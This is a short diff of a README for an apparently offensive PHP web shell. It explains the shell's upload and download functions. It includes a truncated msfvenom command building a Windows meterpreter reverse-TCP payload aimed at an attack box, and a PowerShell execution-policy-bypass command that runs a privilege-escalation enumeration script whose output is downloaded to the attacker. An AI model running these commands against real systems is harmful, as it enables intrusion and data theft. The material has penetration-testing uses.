@@ -29,7 +29,7 @@ venom.exe : (sudo) msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXI
 If using the select field, choose your file and click "upload". files linked in the select field options need to be present at the web root&sup;1 at the ip address and port in lines 10 and 11 of nsscmdshell.php. <br>
 If using the open file dialog option, only files present at the ip address and port specified can be uploaded. <br>
 For the download option, simply enter the filename to be downloaded from the working directory of the target machine. Please note that files which can be managed by your browser will be opened in your browser - i.e., entering a text or html file to be downloaded will instead open the file in the web browser.<br>   
-Example usage: run jaws-enum.ps1 - output to jaws.txt <code>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt</code>, then download the output file to your attack machine for later close examination.<br>
+Example usage: run jaws-enum.ps1 - output to jaws.txt <code>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt</code>, then download the output file to your attack machine for later close examination.<br><br>
 
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png" />
 </p>
